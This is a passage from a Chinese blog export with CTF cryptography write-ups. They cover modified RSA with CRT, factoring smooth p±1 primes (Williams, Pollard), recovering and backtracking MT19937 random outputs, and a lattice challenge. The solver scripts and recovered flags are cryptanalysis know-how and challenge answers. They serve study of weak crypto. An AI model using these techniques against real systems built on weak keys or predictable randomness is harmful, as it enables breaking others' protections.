class="built_in">print</span>(long_to_bytes(decrypt(c1, c2)))</span><br></pre></td></tr></table></figure>

<p>应该是出题人有意为之的，但何必呢</p>
<h4 id="加密解密原理"><a href="#加密解密原理" class="headerlink" title="加密解密原理"></a>加密解密原理</h4><p>在做的过程中，有一点令我感到疑惑，一开始看到解密函数时，我认为这并不是针对加密函数的；也就是说，我以为的考点是让我们自己实现解密函数的</p>
<blockquote>
<p>生成随机数</p>
</blockquote>
<p>生成p，q，g1，g2，（g，r1，r2$\in$[1, N]）<br>$$<br>\begin{align}<br>g_1=g^{r_1\times(p-1)}\ mod\ N\\<br>g_2=g^{r_2\times(q-1)}\ mod\ N<br>\end{align}<br>$$</p>
<blockquote>
<p>加密</p>
</blockquote>
<p>加密后的结果是c1，c2，（s1，s2$\in$[1, N]）<br>$$<br>\begin{align}<br>c_1=m\times g_1^{s_1}\ mod\ N\\<br>c_2=m\times g_2^{s_2}\ mod\ N<br>\end{align}<br>$$</p>
<blockquote>
<p>解密</p>
</blockquote>
<p>看他的样子是解以下这个同余方程组<br>$$<br>\begin{align}<br>m\equiv c_1\ (mod\ p)\\<br>m\equiv c_2\ (mod\ q)<br>\end{align}<br>$$<br>顺便再来回顾以下CRT的通式，直接抄维基百科上的了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706144819994.png" alt="image-20210706144819994"></p>
<p>但问题是m和c满足这个同余方程组吗？就像是ElGamal一样，他乘了一个数，不应该乘以其的逆元吗？</p>
<p>然后尚师傅点醒我了，由$g_1=g^{r_1\times(p-1)}\ mod\ N$可知，<br>$$<br>g_1\equiv g^{r_1\times (p-1)}\equiv 1\ (mod\ p)<br>$$<br>这就是欧拉定理</p>
<p><img data-src="https://i.imgur.com/KftFFd3.gif" alt="欧拉"></p>
<p>所以在模p和模q时，那个加密时多乘的数就变成1了</p>
<p><strong>总之，回到题目，说是一种修改过的RSA加密模式；当然在课上也学过用CRT加速RSA的解密，前提是要知道p和q，和这个异曲同工吧。或者应该说，这种方法有点借鉴了ElGamal加密算法的思想</strong></p>
<h3 id="easy-RSA"><a href="#easy-RSA" class="headerlink" title="easy_RSA"></a>easy_RSA</h3><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getprime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        n = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= next_prime(randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">        <span class="keyword">if</span> isPrime(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;flag&#123;************************************&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getprime(<span class="number">505</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> m &lt; q</span><br><span class="line"></span><br><span class="line">n = p * q * r</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(q ** <span class="number">2</span>, p ** <span class="number">2</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, <span class="number">2</span>, r)</span><br><span class="line">cipher = <span class="built_in">pow</span>(c, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line"><span class="string">7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440</span></span><br><span class="line"><span class="string">1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>终于来了</p>
<p>先看三个素数，这里出题人狡诈，p是用题目中的getprime函数得出来的，q和r则是用Crypto库中的getPrime得到的</p>
<p>所以看函数就知道，p+1可以很好地得到分解</p>
<p>我们求解的步奏一步步反推回去应该是这样</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706161649767.png" alt="image-20210706161649767"/>

<p>必须知道p和q，然后求出r</p>
<p>好吧，不会了，用之前看到的分解去试试</p>
<p>竟然！被同样的招式打败了。应该也是出题人使然</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706162410515.png" alt="image-20210706162410515"></p>
<p>但p确实满足上述性质</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706162852340.png" alt="image-20210706162852340"></p>
<p>那就先按照上面的流程写脚本吧</p>
<p>在最后一个箭头处，由于算来的c是512位的，所以不能对c进行直接开方；那么rabin攻击呢，模数是一个质数；终于，被老师催更无数，<strong>平方根算法</strong>登场，网上看到的一些jo本大多都是基于这个算法的实现的</p>
<blockquote>
<p>脚本编写</p>
</blockquote>
<p>emmmmm时间来不及了，先用下库函数了，后续再补充，老师等我</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_mod</span><br><span class="line"></span><br><span class="line">n = <span class="number">7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409</span></span><br><span class="line">d = <span class="number">7515987842794170949444517202158067021118454558360145030399453487603693522695746732547224100845570119375977629070702308991221388721952258969752305904378724402002545947182529859604584400048983091861594720299791743887521228492714135449584003054386457751933095902983841246048952155097668245322664318518861440</span></span><br><span class="line">cipher = <span class="number">1618155233923718966393124032999431934705026408748451436388483012584983753140040289666712916510617403356206112730613485227084128314043665913357106301736817062412927135716281544348612150328867226515184078966397180771624148797528036548243343316501503364783092550480439749404301122277056732857399413805293899249313045684662146333448668209567898831091274930053147799756622844119463942087160062353526056879436998061803187343431081504474584816590199768034450005448200</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = <span class="number">102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393</span></span><br><span class="line">q = <span class="number">7534810196420932552168708937019691994681052660068275906973480617604535381306041583841106383688654426129050931519275383386503174076258645141589911492908993</span></span><br><span class="line">r = <span class="number">10269028767754306217563721664976261924407940883784193817786660413744866184645984238866463711873380072803747092361041245422348883639933712733051005791543841</span></span><br><span class="line"><span class="keyword">assert</span> d == invert(q**<span class="number">2</span>, p**<span class="number">2</span>)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">c = <span class="built_in">pow</span>(cipher, d, n)</span><br><span class="line"><span class="comment"># print(c.bit_length())</span></span><br><span class="line"><span class="comment"># 512</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"><span class="comment"># c = 8081092455112516397361105816900490085355315574087538340788309885334106796325593823678787887569920404814986643819898763828872716522338864714182757065213683</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(nthroot_mod(c, <span class="number">2</span>, r)))</span><br></pre></td></tr></table></figure>

<h4 id="光滑数"><a href="#光滑数" class="headerlink" title="光滑数"></a>光滑数</h4><p>之前就想整理Crypto中关于光滑数的考点</p>
<p>所谓光滑数就是：<strong>是一个可以因数分解为小素数乘积的正整数</strong></p>
<p>然后有两个算法可以分解，一是这道题讲的<a href="https://en.wikipedia.org/wiki/Williams'_p_%2B_1_algorithm">Williams’p+1 algorithm</a>，还有一种是解减一是光滑数的<a href="https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm">Pollard’s p−1 algorithm</a>，可以使用这个python的包来解</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m primefac -vs -m=p-1 XXXXX</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m primefac -vs -m=+1 XXXXXX</span><br></pre></td></tr></table></figure>

<p>来道题</p>
<blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, sieve_base <span class="keyword">as</span> primes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myPrime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)</span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">p = myPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 1224542620373200232525165378018470774334801515191193204875465445916504222883935188890019876845076388385357911730689547124547346252951158814249284724565588433721828377715469374541007756509231399263095022024229078845538543233785364809917406108015271780070196140628158427541531563472532516237632553353655535922926443707617182025475004547531104052989085765070550150028833424395972178427807901747932614235844448614858629761183210600428438018388051958214596857405813088470933109693499438012040822262549119751099008671892966082341548512112435591881692782766559736840448702039918465573051130405935280702181505538733234675792472428666968900055706926735800561218167237812066851519973807203332801575980055838563085817664973968944323258406789203078387708964307931318918136664885818917720073433998810127482159223895026085726623747340692196977140382318293090736558135980651252533606603312148824142669800602887109353065489282386215179238458743567166284295855288783740314247952124965482197632971993708775190564519250754150756867653033527903848903210074426177258586450311109023467944412194124015505951966140443860862968311560843608415723549525497729679097936310538451467530605937684408079363677707513923579164067808729408365886209340192468399685190639</span></span><br><span class="line"><span class="comment"># c = 145742860621666495489510776707734134231023214235535481878205099324276369445463746101469487674333600296204530932386373415987357363515200117271393133347844479863240936801112306080456942844796779477817786176831015954410967693647534326733641573842953783193563678040093734579772976410574013857063137696465850300484753282472377882118892522844694078667622111244886303620349388556315704648609353412177123230438077637042880490566244740468503369707900343076369151796123461132932226563486870411965536062339169788331659119981901553536009275158600580698576110294775989992794065611215170351808698605911258789407992833170968332058255364527244293283228694886707241979238145252395651417561576433516407782575454294499521347378058366557950770592472271985004818847838711060048422015207674862177145761946560579360220239667890707135827136815780729363013864130107808776517514214310689477005999830284272130148939734935547341627208913181919190392205389452185597444280635342938046191904062547803917870268485346888653569349729643793041018550170090471310374856687407102762116819004790791936814214507908374380597027347007448114684844276041116955473180015221164545212550832233007714133699817366745648092776901013502840540012912660742166994968977400188176557657864</span></span><br></pre></td></tr></table></figure>

<p>显然p是n-1类型的光滑数，但是直接食用工具，效果不佳；再次确认，前面的两题是出题人有意为之</p>
<p>所以跟着CSDN大佬来看下Pollard’s p−1算法的食用方法</p>
<blockquote>
<p>推导步奏</p>
</blockquote>
<p>目标很明确，通过p分解n</p>
<p>所谓的Pollard’s p−1算法就是<br>如果p-1是光滑数，那么n!就能被p-1整除，即n!=t(p-1)<br>对于n=2,3,4,…，只要<br>$$<br>gcd(2^{n!}-1, N)\neq 1和N<br>$$<br>就成功分解N了<br>以上算法适用于p是N的因数，且p-1是光滑数</p>
<p>当然求n的阶乘是个耗费资源的事情，所以我们对递归式子精心简化，这样就不用重复计算了<br>$$<br>2^{n!}\ mod\ N=(2^{(n-1)!}\ mod\ N)^{n}\ mod\ N<br>$$</p>
<p>而由我们熟悉的费马定理可以推出<br>$$<br>2^{t(p-1)}\equiv 1\ mod\ p<br>$$<br>改写成等式<br>$$<br>2^{t(p-1)}-1=kp<br>$$<br>所以$2^{t(p-1)}-1$是p的倍数，结合前面推出的，我们得到的结论是<br>$$<br>2^{n!}-1=kp<br>$$<br><strong>通过枚举n求kp，求kp和N的公因子就是p</strong></p>
<p>也没看得特别懂，最后得到的递推式子是<br>$$<br>2^{n!}\ mod\ N=<br>\begin{cases}<br>2^2\ mod\ N&amp; {n=2}\\<br>(2^{(n-1)!}\ mod\ N)^n\ mod\ N&amp; {n \geq 3}<br>\end{cases}<br>$$</p>
<p>抄了别人这么多了，自己实现一下代码</p>
<p>感觉被套路了，还是自己算法到代码的能力太差；最后写出来的脚本是这样的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_p_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    i = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a-<span class="number">1</span>, n) == <span class="number">1</span> <span class="keyword">or</span> gcd(a-<span class="number">1</span>, n) == n:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, i, n)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">return</span> gcd(a-<span class="number">1</span>, n)</span><br></pre></td></tr></table></figure>

<p>要跑挺久的，虽然也才十几万次</p>
<p>最后得到的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Pollard_s_p-1_&amp;_William_s_p+1&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h3><blockquote>
<p> 题目描述</p>
</blockquote>
<p>Can you trace back to the past?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env/python3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        f.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目名为回溯</p>
<p>妥妥的MT19937，好在之前做过；它有一千个随机数，需要找到这一千个随机数的前面一个</p>
<p>问题来了，之前GKCTF做到的，以及之前类似的题目都是预测之后的随机数，那么要反过来，预测之前的那应该怎么做呢？</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706221554229.png" alt="image-20210706221554229"></p>
<p>别急，大佬还是有解法，贴下连接这里直接抄脚本了，后续研究</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="comment"># right shift inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_right</span>(<span class="params">res,shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># right shift with mask inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_right_values</span>(<span class="params">res,shift,mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp&gt;&gt;shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># left shift inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_left</span>(<span class="params">res,shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># left shift with mask inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_left_values</span>(<span class="params">res,shift,mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace</span>(<span class="params">cur</span>):</span></span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i+<span class="number">624</span>]^state[i+<span class="number">397</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>+<span class="number">624</span>]^state[i+<span class="number">396</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_state</span>(<span class="params">out</span>):</span></span><br><span class="line">    state = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">        i = inverse_right(i,<span class="number">18</span>)</span><br><span class="line">        i = inverse_left_values(i,<span class="number">15</span>,<span class="number">0xefc60000</span>)</span><br><span class="line">        i = inverse_left_values(i,<span class="number">7</span>,<span class="number">0x9d2c5680</span>)</span><br><span class="line">        i = inverse_right(i,<span class="number">11</span>)</span><br><span class="line">        state.append(i)</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;../output.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    c.append(<span class="built_in">int</span>(f[i].strip()))</span><br><span class="line"></span><br><span class="line">partS = recover_state(c)</span><br><span class="line">state = backtrace([<span class="number">0</span>]*<span class="number">4</span>+partS)[:<span class="number">624</span>]</span><br><span class="line"><span class="comment"># print(state)</span></span><br><span class="line">prng = Random()</span><br><span class="line">prng.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">0</span>]),<span class="literal">None</span>))</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(prng.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<hr>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706221821180.png" alt="image-20210706221821180"></p>
<p>你说说你还有什么用，只会抄WP</p>
<p>花了两天，算是过了一遍，但是越到后面，研究的劲头就越低，很多资料还是要消化成自己的东西</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>光滑数</tag>
      </tags>
  </entry>
  <entry>
    <title>20210509 RedhatCrypto方向WP</title>
    <url>/posts/e881af84/</url>
    <content><![CDATA[<p>emmmmm发现都是原题，当时还不善用搜索引擎，打得不怎么样</p>
<span id="more"></span>

<h1 id="20210509-RedhatCrypto方向WP"><a href="#20210509-RedhatCrypto方向WP" class="headerlink" title="20210509 RedhatCrypto方向WP"></a>20210509 RedhatCrypto方向WP</h1><h2 id="primegame（recuring）"><a href="#primegame（recuring）" class="headerlink" title="primegame（recuring）"></a>primegame（recuring）</h2><h3 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">len</span>(flag) == <span class="number">48</span>)</span><br><span class="line">msg1 = flag[:<span class="number">24</span>]</span><br><span class="line">msg2 = flag[<span class="number">24</span>:]                        </span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg1):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)                  </span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg2):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ct1 = 597952043660446249020184773232983974017780255881942379044454676980646417087515453</span><br><span class="line">ct2 = 425985475047781336789963300910446852783032712598571885345660550546372063410589918</span><br></pre></td></tr></table></figure>

<h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a>二、解题思路</h3><p>这道题原本的思路是加一个底数e，然后依次逼近msg里的各个值的</p>
<img alt="README-ea39f5b9.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-ea39f5b9.png" width="" height="" >

<p>但是几次给我sage跑挂了，应该是精度和容量问题，而且sage不支持decimal设置精度</p>
<p>然后想到之前有道类似的题目，因为它这里一直在c乘以keys[i]，有24组，所以就想到了格，构造一个类似这样子的格</p>
<img alt="README-423b7374.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-423b7374.png" width="" height="" >

<p>先是得到我们的对数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span>         <span class="comment"># 设置精度</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br></pre></td></tr></table></figure>

<p>然后将矩阵第一列求出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    keys[i] = keys[i]*<span class="number">2</span>**<span class="number">256</span></span><br><span class="line"><span class="comment"># keys = [Decimal(&#x27;80260960185991308862233904206310070533990667611589946606122867505419956976171.90515840808613629846290&#x27;), Decimal(&#x27;127210612166669937440098469708903225618405881204503139663605609326034899514764.6663743746583129556012&#x27;), Decimal(&#x27;186360178378489239360019555208872516895923557828929525429878875918225512971166.4414609219754360277383&#x27;), Decimal(&#x27;225321001627212097357564035919404985096695078055324870037864774600825628967482.2417219510600154726596&#x27;), Decimal(&#x27;277657303409607584257674154656459195924000370301674371438196861060248384105244.3993444331039604677255&#x27;), Decimal(&#x27;297000844888383098784779809484430885883324243241834148304083596811292939014380.4674208212385311778134&#x27;), Decimal(&#x27;328063692363312405002199287825630301497469991361288129915249443621480610038009.0012924032254942097990&#x27;), 